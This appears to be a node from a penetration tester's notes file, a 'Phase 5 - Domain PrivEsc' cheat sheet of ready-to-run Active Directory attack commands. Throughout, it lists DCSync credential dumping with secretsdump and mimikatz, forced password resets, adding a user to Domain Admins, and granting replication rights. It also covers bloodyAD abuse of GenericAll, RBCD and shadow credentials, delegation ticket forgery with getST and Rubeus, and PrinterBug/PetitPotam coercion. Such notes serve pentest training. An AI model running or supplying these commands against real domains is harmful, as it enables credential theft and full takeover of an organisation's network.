      <node name="Phase 5 - Domain PrivEsc" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc
# Launching remote DCSync administrative accounts replication requests (Linux)
--------------------------------------------------
lsadump::dcsync /user:krbtgt /domain:corp.local
# Native DCSync active directory credential extraction loops (Mimikatz)
--------------------------------------------------
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force) -Credential $cred
# Forcing domain object security secret resets via Write configuration rights abuses
--------------------------------------------------
Add-DomainGroupMember -Identity "Domain Admins" -Members stephanie
# Direct account propagation into privileged security group objects structures
--------------------------------------------------
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity stephanie -Rights DCSync
# Forcing arbitrary assignment of DCSync security rights over active domain controllers
--------------------------------------------------
bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' add genericAll "CN=Domain Admins,CN=Users,DC=ignite,DC=local" aaru
# BloodyAD: Grant GenericAll on security groups to gain full configuration control
--------------------------------------------------
bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' add dcsync kinjal
# BloodyAD: Inject complete directory replication rights (GetChangesAll) onto a controlled user
--------------------------------------------------
bloodyAD -u geet -p 'Password@1' -d ignite.local --host 192.168.1.11 add computer fakecomp 'Password@123'
# BloodyAD: Create fake computer account to act as the delegation bridge head (RBCD)
--------------------------------------------------
bloodyAD --host 192.168.1.11 -u geet -p 'Password@1' -d ignite.local add rbcd 'DC$' 'fakecomp$'
# BloodyAD: Configure RBCD impersonation pathway by writing fake computer SID to target DC
--------------------------------------------------
impacket-getST ignite.local/'fakepc$':Password@123 -spn cifs/DC.ignite.local -impersonate administrator -dc-ip 192.168.1.11
# Request constrained impersonation ticket for RBCD attack
--------------------------------------------------
bloodyAD --host 192.168.1.11 -u sita -p Password@1 -d ignite.local add shadowCredentials DC$
# BloodyAD: Register public key mapping directly into target computer's msDS-KeyCredentialLink (Shadow Creds)
--------------------------------------------------
Get-DomainUser -TrustedToAuth | select samaccountname,msDS-AllowedToDelegateTo
# Searching the domain schema for accounts assigned trusted-to-authentication privileges (Constrained Delegation)
--------------------------------------------------
getST.py -spn cifs/&lt;TARGET_FQDN&gt; -impersonate Administrator -dc-ip 192.168.x.100 'corp.local/&lt;DELEG_USER&gt;:&lt;DELEG_PASS&gt;'
# Exploiting constrained delegation objects via S4U service ticket generation loops
--------------------------------------------------
Get-DomainComputer -Unconstrained | select name,dnshostname
# Scanning domain compute nodes to identify unconstrained delegation configurations weaknesses
--------------------------------------------------
.\Rubeus.exe monitor /interval:5 /filteruser:DC$
# Launching active monitoring infrastructure arrays targeting incoming security token transactions
--------------------------------------------------
python3 printerbug.py corp.local/stephanie:'Password123'@&lt;DC_IP&gt; &lt;UNCONS_DELEG_IP&gt;
# Coercing high-privilege domain assets connection streams via legacy spooler protocols (PrinterBug)
--------------------------------------------------
python3 PetitPotam.py -u stephanie -p 'Password123' &lt;UNCONS_DELEG_IP&gt; &lt;DC_IP&gt;
# Coercing direct inbound domain controller connections via alternate network shares (PetitPotam)
--------------------------------------------------</rich_text>
